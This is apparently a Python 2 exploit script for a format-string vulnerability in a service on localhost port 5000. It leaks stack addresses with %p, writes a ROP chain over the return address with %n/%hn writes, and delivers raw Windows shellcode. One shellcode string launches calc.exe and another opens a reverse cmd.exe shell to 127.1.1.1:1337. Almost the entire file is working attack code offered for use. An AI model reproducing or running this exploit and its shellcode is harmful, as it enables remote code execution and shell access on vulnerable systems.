import socket
import struct
import time


host = "127.0.0.1"
port = 5000
shell = "\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x40\x1c\x8b\x04\x08\x8b\x04\x08\x8b\x58\x08\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda\x8b\x72\x20\x01\xde\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x49\x8b\x72\x24\x01\xde\x66\x8b\x0c\x4e\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x89\xd6\x31\xc9\x51\x68\x45\x78\x65\x63\x68\x41\x57\x69\x6e\x89\xe1\x8d\x49\x01\x51\x53\xff\xd6\x87\xfa\x89\xc7\x31\xc9\x51\x68\x72\x65\x61\x64\x68\x69\x74\x54\x68\x68\x41\x41\x45\x78\x89\xe1\x8d\x49\x02\x51\x53\xff\xd6\x89\xc6\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe1\x6a\x01\x51\xff\xd7\x31\xc9\x51\xff\xd6"
shell2 = "\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x48\x10\x8b\x59\x3c\x01\xcb\x8b\x5b\x78\x01\xcb\x8b\x73\x20\x01\xce\x31\xd2\x42\xad\x01\xc8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x73\x1c\x01\xce\x8b\x14\x96\x01\xca\x31\xc0\x50\x83\xec\x18\x8d\x34\x24\x89\x16\x89\xcf\x68\x73\x41\x42\x42\x66\x89\x44\x24\x02\x68\x6f\x63\x65\x73\x68\x74\x65\x50\x72\x68\x43\x72\x65\x61\x8d\x04\x24\x50\x51\xff\xd2\x83\xc4\x10\x89\x46\x04\x31\xc9\x68\x65\x73\x73\x41\x88\x4c\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x8d\x0c\x24\x51\x57\xff\x16\x83\xc4\x0c\x89\x46\x08\x31\xc9\x51\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x8d\x0c\x24\x51\x57\xff\x16\x83\xc4\x0c\x31\xc9\x68\x6c\x6c\x41\x41\x66\x89\x4c\x24\x02\x68\x33\x32\x2e\x64\x68\x77\x73\x32\x5f\x8d\x0c\x24\x51\xff\xd0\x83\xc4\x08\x89\xc7\x31\xc9\x68\x75\x70\x41\x41\x66\x89\x4c\x24\x02\x68\x74\x61\x72\x74\x68\x57\x53\x41\x53\x8d\x0c\x24\x51\x50\xff\x16\x83\xc4\x0c\x89\x46\x0c\x31\xc9\x68\x74\x41\x42\x42\x66\x89\x4c\x24\x02\x68\x6f\x63\x6b\x65\x68\x57\x53\x41\x53\x8d\x0c\x24\x51\x57\xff\x16\x83\xc4\x0c\x89\x46\x10\x31\xc9\x68\x63\x74\x41\x41\x66\x89\x4c\x24\x02\x68\x6f\x6e\x6e\x65\x68\x57\x53\x41\x43\x8d\x0c\x24\x51\x57\xff\x16\x83\xc4\x0c\x89\x46\x14\x31\xc9\x51\x66\xb9\x90\x01\x29\xcc\x8d\x0c\x24\x31\xdb\x66\xbb\x02\x02\x51\x53\xff\x56\x0c\x31\xc9\x51\x51\x51\xb1\x06\x51\x83\xe9\x05\x51\x41\x51\xff\x56\x10\x97\x31\xc9\x51\x51\x51\x51\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x05\x39\xc7\x44\x24\x04\x7f\x01\x01\x01\x31\xc9\x8d\x1c\x24\x51\x51\x51\x51\xb1\x10\x51\x53\x57\xff\x56\x14\x31\xc9\x39\xc8\x75\xe9\x31\xc9\x83\xec\x10\x8d\x14\x24\x57\x57\x57\x51\x66\x51\x66\x51\xb1\xff\x41\x51\x31\xc9\x51\x51\x51\x51\x51\x51\x51\x51\x51\x51\xb1\x44\x51\x8d\x0c\x24\x31\xd2\x68\x65\x78\x65\x41\x88\x54\x24\x03\x68\x63\x6d\x64\x2e\x8d\x14\x24\x53\x51\x31\xc9\x51\x51\x51\x41\x51\x31\xc9\x51\x51\x52\x51\xff\x56\x04\x50\xff\x56\x08"
shell3 = "\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x48\x10\x31\xdb\x8b\x59\x3c\x01\xcb\x8b\x5b\x78\x01\xcb\x8b\x73\x20\x01\xce\x31\xd2\x42\xad\x01\xc8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x73\x1c\x01\xce\x8b\x14\x96\x01\xca\x89\xd6\x89\xcf\x31\xdb\x68\x79\x41\x41\x41\x66\x89\x5c\x24\x01\x68\x65\x6d\x6f\x72\x68\x65\x72\x6f\x4d\x68\x52\x74\x6c\x5a\x54\x51\xff\xd2\x83\xc4\x10\x31\xc9\x89\xca\xb2\x54\x51\x83\xec\x54\x8d\x0c\x24\x51\x52\x51\xff\xd0\x59\x31\xd2\x68\x73\x41\x42\x42\x66\x89\x54\x24\x02\x68\x6f\x63\x65\x73\x68\x74\x65\x50\x72\x68\x43\x72\x65\x61\x8d\x14\x24\x51\x52\x57\xff\xd6\x59\x83\xc4\x10\x31\xdb\x68\x65\x78\x65\x41\x88\x5c\x24\x03\x68\x63\x6d\x64\x2e\x8d\x1c\x24\x31\xd2\xb2\x44\x89\x11\x8d\x51\x44\x56\x31\xf6\x52\x51\x56\x56\x56\x56\x56\x56\x53\x56\xff\xd0\x5e\x83\xc4\x08\x31\xdb\x68\x65\x73\x73\x41\x88\x5c\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x8d\x1c\x24\x53\x57\xff\xd6\x31\xc9\x51\xff\xd0"
payload = '\x00\x02\x00\x00%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p'
#payload4 = 'QUIT' + '\x90' * 100 +shell

def fmt(addr_temp, dest, s):
	payload1 = '%p%p%p%p%p%p%p%' 	#11111p%hnBBBB'
	payload2 = 'a%p%p%p%p%p%p%p%'	#11111p%nBBBB'
	if addr_temp < 0x1869f:
		op = str(addr_temp - 57)
		
		if len(op) < 5:
			for i in range(len(op),5):
				op = '0' + op
		payload = payload2 + op + 'p%n' + struct.pack('<I', dest)
		print payload
		time.sleep(0.5)
		s.send(payload)

	else:
		payload = 'a%p%p%p%p%p%p%p%00001p%n' + struct.pack('<I', dest)
		time.sleep(0.5)
		s.send(payload)
		if addr_temp < 0x1000000:
			op = str(int(hex(addr_temp)[2:6],16) - 56)
			if len(op) < 5:
				for i in range(len(op),5):
					op = '0' + op
			payload = payload1 + op + 'p%hn' + struct.pack('<I', dest + 1)
			time.sleep(0.5)
			s.send(payload)
			op = str(int(hex(addr_temp)[4:8],16) - 56)
			if len(op) < 5:
				for i in range(len(op),5):
					op = '0' + op
			payload = payload1 + op + 'p%hn' + struct.pack('<I', dest)
			time.sleep(0.5)
			s.send(payload)

		else:
			a = hex(addr_temp)
			if len(a) == 9:
				a = '0' + a[2:9]
			else:
				a = a[2:10]
			op = str(int(a[0:4],16) - 56)
			if len(op) < 5:
				for i in range(len(op),5):
					op = '0' + op
			payload = payload1 + op + 'p%hn' + struct.pack('<I', dest + 2)
			time.sleep(0.5)
			s.send(payload)
			op = str(int(a[4:8],16) - 56)
			if len(op) < 5:
				for i in range(len(op),5):
					op = '0' + op
			payload = payload1 + op + 'p%hn' + struct.pack('<I', dest)
			time.sleep(0.5)
			s.send(payload)

		#print 'trigger'



s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

time.sleep(0.5)
s.send(payload)
time.sleep(0.5)
a = s.recv(1024)
print a
print 'buf = ' + a[183:191]

addr_buf = int(a[183:191], 16)
addr_ret = addr_buf + 0x204
addr_stack = int(a[183:187] + '6000', 16)
print hex(addr_ret)

addr_4byteFirst = a[167:171]
addr_4byteFirst_buf = a[183:187]
edi = int(addr_4byteFirst + '1000', 16)
esi = int('100c', 16)
addr_w = int(addr_4byteFirst + '3000', 16)
addr_sprinf = int(addr_4byteFirst + '3000', 16)

#payload2 = struct.pack('<I', buf) 
#payload2 = '%p%p%p%p%p%p%p%11111p%hnBBBB'
payload2 = '%p%p%p%p%p%24p%n' +  struct.pack('<I', addr_ret+48)  

pl_quit = 'QUIT'  + shell

print '4byteF = ' + a[167:171]
s.send(payload2)
#time.sleep(0.5)
#raw_input()
#s.send(payload4)
fmt(0x65701e04, addr_ret, s)
fmt(edi, addr_ret+4, s)
fmt(esi, addr_ret+8, s)
fmt(0x65703983, addr_ret+16, s)
fmt(0x6570346a, addr_ret+32, s)
fmt(addr_stack, addr_ret+36, s)
fmt(0xa000, addr_ret+40, s)
fmt(0x1000, addr_ret+44, s)
s.send(payload2)
fmt(addr_buf+4, addr_ret+52, s)
fmt(0x65701f8e, addr_ret+56, s)
#fmt(int(addr_4byteFirst + '1000', 16), addr_ret+52, s)
#fmt(int('10BC', 16), addr_ret+56, s)
#fmt(0x65703983, addr_ret+64, s)
#fmt(0x10000, addr_ret+80, s)
#fmt(0x10000, addr_ret+84, s)
#fmt(addr_buf+4, addr_ret+88, s)
time.sleep(0.5)
s.send(pl_quit)
#0x65701e04 + edi + esi + aaaa + 0x65703983 + 'aaaa'*3 + ret + param
raw_input()

#19fd70
#\x70\xfd\x19\x00
